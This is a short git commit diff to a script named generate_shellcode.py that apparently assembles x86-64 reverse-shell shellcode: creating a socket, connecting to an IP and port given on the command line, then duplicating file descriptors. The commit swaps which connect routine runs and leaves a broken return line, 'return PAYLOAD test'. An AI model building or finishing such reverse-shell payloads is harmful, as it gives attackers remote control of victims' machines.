f512c1872396c502d9155902a3113e0fbc77414c
Dupety Gabriel <gabdupety@hotmail.fr>
2023-03-03 11:29:33 +0100

    repush

--- generate_shellcode.py
+++ generate_shellcode.py
@@ -376,7 +376,7 @@ def deof_socket_connect(ip, port):
     print("ouou",PAYLOAD)
     PAYLOAD += "b218" # mov dl,24
     PAYLOAD += call()
-    return PAYLOAD
+    return PAYLOAD test
 """
 
 def dup2x3():
@@ -512,8 +512,8 @@ PAYLOAD += clean("rdi")
 PAYLOAD += clean("rsi")
 PAYLOAD += clean("rsi")
 create_socket()
-#connect_socket(argv[1], argv[2])
-deof_socket_connect(argv[1], argv[2])
+connect_socket(argv[1], argv[2])
+#deof_socket_connect(argv[1], argv[2])
 dup2x3()
 #shell()
 #deof_shell()
